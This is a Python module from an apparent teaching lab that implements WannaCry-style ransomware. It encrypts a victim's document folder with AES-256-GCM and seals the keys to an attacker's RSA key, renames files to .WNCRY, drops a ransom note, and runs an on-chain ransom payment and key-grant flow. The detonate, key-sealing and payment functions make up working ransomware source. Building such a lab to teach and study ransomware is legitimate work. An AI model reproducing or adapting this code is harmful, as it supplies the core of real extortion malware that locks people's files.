"""What the ransomware does on a victim.

On arrival: lock the documents, leave the note, and leave the `ransom` menu
behind. From then on the victim works through that menu: create a wallet,
buy lab money, pay, receive the key, and decrypt by hand.

The menu arrives with the worm, like the window real ransomware shows only
after it has infected a machine. Nothing of this is installed on the victim
when the lab is built.

The settings are the payload's label, which the worm carries along: the
documents folder, the suffix, the note, the operator's public key, and the
payment chain when the lab has one.
"""

import base64
import json
from pathlib import Path
import socket

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

import label

from . import files, keys, paths

#: What a lab action may raise and have shown as a message instead of a crash.
ERRORS = (OSError, ValueError, KeyError, TypeError, AttributeError, RuntimeError)

#: The note a case gets when it brings none of its own.
DEFAULT_NOTE = """Ooops, your documents are locked!

Every document in this folder has been encrypted and now carries the
extension .WNCRY. The key that unlocks them is held by the attacker.

To recover your documents, run the menu:

    ransom

It lets you create a wallet, buy lab money on the exchange, pay the ransom,
and receive your decryption key.
"""


def participant_id() -> str:
    """This machine's address, which is how the lab names its machines.

    Falls back to the hostname when the address cannot be found.
    """
    try:
        return socket.gethostbyname(socket.gethostname())
    except OSError:
        return socket.gethostname()


def detonate(home, settings: dict) -> int:
    """Run the ransomware on this machine. Returns the number of documents locked.

    The keys are written first, then the documents are replaced: if anything
    stops in between, the key record is already on the disk.
    """
    if paths.KEYLOG.exists():
        raise ValueError("this machine was already locked")
    if "attacker_pub_pem" not in settings:
        raise KeyError("the payload carries no attacker public key")
    suffix = settings.get("suffix", ".WNCRY")
    folder = files.check_folder(settings["documents"], suffix)
    who = participant_id()
    attacker_pub_pem = settings["attacker_pub_pem"]
    attacker_pub = keys.load_pub_pem(attacker_pub_pem.encode("ascii"))

    victim_priv = keys.new_rsa_keypair()
    file_key = AESGCM.generate_key(bit_length=256)
    record = files.encrypt_all(folder, who, file_key, suffix)

    keys.write_json(paths.KEYLOG, {
        "participant_id": who,
        "documents": str(folder),
        "suffix": suffix,
        "attacker_pub_pem": attacker_pub_pem,
        "victim_pub_pem": keys.pub_pem(victim_priv.public_key()).decode("ascii"),
        "victim_priv_sealed": keys.seal_with_rsa_pub(attacker_pub, keys.priv_pem_from(victim_priv)),
        "file_key_sealed": keys.seal_with_rsa_pub(victim_priv.public_key(), file_key),
        "files": record,
    }, private=True)
    files.apply_lock(folder, record, suffix)
    keys.write_json(paths.RECORD, {
        "participant_id": who,
        "state": "ENCRYPTED",               # shown by the menu; RESTORED once the documents are back
        "documents": str(folder),
        "original_hashes": {name: entry["sha256"] for name, entry in record.items()},
    }, private=True)
    if settings.get("payment"):
        keys.write_json(paths.CHAIN, settings["payment"])
    (folder / paths.NOTE_NAME).write_text(settings.get("note") or DEFAULT_NOTE, encoding="utf-8")
    drop_menu(home)
    return len(record)


def run(home=None, folder=None) -> int:
    """What the start command of the payload does: read its label, lock, leave the menu.

    `home` is the folder the worm was unpacked in, where this package sits;
    `folder` is the package's own folder, where its label is. Both are found
    by themselves when the worm runs the start command.
    """
    home = Path(home) if home else Path(__file__).resolve().parent.parent
    folder = Path(folder) if folder else Path(__file__).resolve().parent
    settings = label.read_label(folder)["settings"]
    count = detonate(home, settings)
    print(f"locked {count} documents in {settings['documents']}")
    return count


def drop_menu(home):
    """Leave the victim a way in: `ransom` starts the menu from the arrived code."""
    command = paths.MENU
    command.parent.mkdir(parents=True, exist_ok=True)
    command.write_text(
        '#!/bin/bash\nPYTHONPATH={} exec python3 -m yom_ransomware "$@"\n'.format(home),
        encoding="utf-8",
    )
    command.chmod(0o755)


# ---- paying, and getting the key back ----

def grant_file_key(keylog: dict):
    """Accept the reply, save the key, print the grant. Recover nothing.

    Recovery stays a separate, manual step, the way victims of the real
    ransomware ran a decryptor with the key they were given.
    """
    reply = keys.read_json(paths.REPLY)
    opened = keys.victim_accept_reply(reply, keylog)
    keys.write_json(paths.ACCEPTED, {
        "victim_priv_pem_b64": keys.b64(opened["victim_priv_pem"]),
        "file_key_b64": keys.b64(opened["file_key"]),
    }, private=True)
    print("Attacker reply accepted; file key unsealed with recovered victim key.")
    print()
    print("=" * 60)
    print("  KEY GRANTED - YOUR DECRYPTION KEY (copy it):")
    print()
    print(f"  {keys.b64(opened['file_key'])}")
    print("=" * 60)
    print()
    print("Run the decryptor on this machine and paste this key when asked:")
    print("  ransom decrypt")
    print("It decrypts your documents and verifies them against the")
    print("recorded baselines. Nothing is recovered until you do.")


def recovery_step(password=None):
    """One menu-driven step of the exchange, ending at the KEY GRANTED.

      1. No request yet: build the on-chain request (the sealed victim key).
      2. With a wallet and the chain: register it on-chain with real payment,
         then wait for the operator's reply.
      3. Reply present: accept it, unseal the file key, print KEY GRANTED.
    """
    if not paths.KEYLOG.exists():
        raise ValueError("nothing is locked on this machine")
    keylog = keys.read_json(paths.KEYLOG)

    if paths.REPLY.exists():
        grant_file_key(keylog)
        return

    if not paths.REQUEST.exists():
        request = keys.build_exchange_request(keylog)
        keys.write_json(paths.REQUEST, request, private=True)
        print("EXCHANGE REQUEST (this is the payload that goes on the chain):")
        print(json.dumps(request, indent=2))

    # A registered request already has its on-chain id. This step must then
    # NEVER register again: the payment already happened, and a second
    # registration would pay a second ransom.
    already_registered = keys.read_json(paths.REQUEST).get("request_id") is not None

    if paths.WALLET.exists() and paths.CHAIN.exists() and (password or already_registered):
        # Real transport: one signed, paid registration transaction, then
        # on-chain polling for the operator's reply.
        from . import payment

        config = payment.load(paths.CHAIN)
        try:
            if already_registered:
                request = keys.read_json(paths.REQUEST)
                print(f"payment already made; waiting for the on-chain reply "
                      f"to request {request['request_id']} (no new payment)...")
            else:
                request = payment.pay(config, paths.WALLET, password, paths.REQUEST)
                print(f"registered on-chain: request id {request['request_id']}")
                print(f"payment transaction: {request['transaction_hash']}")
            reply = payment.await_reply(config, request["request_id"])
            keys.write_json(paths.REPLY, reply)
            print(f"attacker reply received on-chain; saved to {paths.REPLY}")
        except (OSError, RuntimeError, TimeoutError) as error:
            print(f"\nOn-chain exchange unavailable: {error}")
            print("Falling back to the manual copy path. Current instructions:")
        else:
            grant_file_key(keylog)
            return

    print("\nNext: on the attacker machine, turn the request into a reply with")
    print(f"    ransom reply --request <a copy of {paths.REQUEST}")
    print(f"then copy the printed reply to this machine as {paths.REPLY}")
    print("and choose document recovery again to accept it and get your key.")


def decrypt(pasted_key: str) -> int:
    """The decryptor: with the granted key, restore every document. Returns how many."""
    try:
        file_key = base64.b64decode(pasted_key.strip().encode("ascii"), validate=True)
    except Exception:
        raise ValueError("that is not valid base64; copy the key exactly as printed")
    if len(file_key) != 32:
        raise ValueError(
            f"expected a 32-byte AES-256 key (got {len(file_key)} bytes); "
            "copy the full key exactly as printed"
        )
    return restore(file_key)


def restore(file_key: bytes) -> int:
    keylog = keys.read_json(paths.KEYLOG)
    who = keylog["participant_id"]
    print()
    print("Decrypting with the pasted key:")
    names = files.unlock(Path(keylog["documents"]), who, file_key, keylog["files"],
                         keylog.get("suffix", ".WNCRY"))
    if paths.RECORD.exists():               # the menu shows the record's state
        record = keys.read_json(paths.RECORD)
        record["state"] = "RESTORED"
        keys.write_json(paths.RECORD, record, private=True)
    for name in names:
        print(f"  decrypting {name}... hash verified")
    print(f"{who}: {len(names)} documents recovered and verified")
    print()
    print("All ransomware envelopes removed. Your documents are back.")
    return len(names)


def documents_state() -> dict:
    """The state of every document, for the menu's inspection screen."""
    if paths.KEYLOG.exists():
        keylog = keys.read_json(paths.KEYLOG)
        return files.inspect(Path(keylog["documents"]), keylog["files"], keylog.get("suffix", ".WNCRY"))
    return {}


def status():
    """One read-only look at this machine: chain, contract, wallet, lock, request. Moves no money."""
    from . import payment

    if paths.KEYLOG.exists():
        keylog = keys.read_json(paths.KEYLOG)
        state = files.inspect(Path(keylog["documents"]), keylog["files"], keylog.get("suffix", ".WNCRY"))
        locked = sum(1 for value in state.values() if value.startswith("ENCRYPTED"))
        print(f"documents: {locked} locked, in {keylog['documents']}  ({keylog['participant_id']})")
    else:
        print("documents: not locked")
    if not paths.CHAIN.exists():
        print("chain:     no chain config here")
        return
    config = payment.load(paths.CHAIN)
    try:
        config = payment.connect(config)
        print(f"chain id {config['chain_id']} at {config['rpc_url']}")
        contract = payment.contract(config)
        size = payment.code_size(config, contract)
        print(f"contract: {contract}")
        print(f"  code on-chain: {size} bytes "
              f"({'ALIVE' if size > 0 else 'DEAD - deployment failed!'})")
        if paths.WALLET.exists():
            address = payment.wallet_address(paths.WALLET)
            balance = payment.balance_wei(config, address)
            print(f"wallet:   {address}")
            price = config.get("ransom_wei", 10**18)
            print(f"  balance: {payment.format_ether(balance)} lab ETH "
                  f"({'can pay the ransom' if balance >= price else 'buy lab ETH on the SEED Exchange (menu option 3)'})")
        else:
            print("wallet:   none yet (create it in the participant menu, option 6)")
    except ERRORS as error:
        print(f"chain:     unreachable or wrong ({error})")
        return

    if paths.REQUEST.exists():
        request = keys.read_json(paths.REQUEST)
        rid = request.get("request_id")
        print("request:  built"
              + (f", registered on-chain as id {rid}" if rid is not None else ", not registered yet"))
    else:
        print("request:  none yet (menu option 5 builds it)")

    requests = payment.paid_requests(config)
    for entry in requests:
        state = "ANSWERED" if entry["answered"] else "waiting for the attacker"
        print(f"chain:    request {entry['id']} from {entry['victim'][:10]}... -> {state}")
    if not requests:
        print("chain:    no requests registered")

    if paths.REPLY.exists():
        print("reply:    received (next menu-5 press accepts it and decrypts)")
    else:
        print("reply:    not received yet")
